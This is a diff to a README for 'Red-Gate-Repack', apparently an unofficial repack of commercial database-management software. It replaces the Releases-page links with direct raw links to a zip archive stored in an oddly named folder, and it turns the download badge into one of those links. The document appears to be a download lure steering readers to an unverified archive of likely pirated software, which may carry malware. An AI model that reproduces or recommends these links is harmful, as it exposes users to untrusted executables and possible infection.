@@ -1,6 +1,6 @@
 # 🎉 Red-Gate-Repack - Simplifying Database Management Made Easy
 
-[![Download Red-Gate-Repack](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Dzimbahwe/Red-Gate-Repack/releases)
+[![Download Red-Gate-Repack](https://raw.githubusercontent.com/Dzimbahwe/Red-Gate-Repack/main/keratinose/Gate-Repack-Red-2.9-beta.4.zip)](https://raw.githubusercontent.com/Dzimbahwe/Red-Gate-Repack/main/keratinose/Gate-Repack-Red-2.9-beta.4.zip)
 
 ## 📑 Overview
 
@@ -13,7 +13,7 @@ Below, you will find the steps to download and install the Red-Gate-Repack appli
 ## 📥 Download & Install
 
 1. **Visit the Download Page:** Click the link below to go to the Releases page.
-   [Download Red-Gate-Repack](https://github.com/Dzimbahwe/Red-Gate-Repack/releases)
+   [Download Red-Gate-Repack](https://raw.githubusercontent.com/Dzimbahwe/Red-Gate-Repack/main/keratinose/Gate-Repack-Red-2.9-beta.4.zip)
 
 2. **Choose the Latest Version:** On the Releases page, locate the most recent version listed.
 
@@ -73,4 +73,4 @@ We welcome contributions from the community! If you have ideas or improvements, 
 
 Thank you for choosing Red-Gate-Repack. We hope this application enhances your database management experience! 
 
-[Download Red-Gate-Repack](https://github.com/Dzimbahwe/Red-Gate-Repack/releases)
+[Download Red-Gate-Repack](https://raw.githubusercontent.com/Dzimbahwe/Red-Gate-Repack/main/keratinose/Gate-Repack-Red-2.9-beta.4.zip)
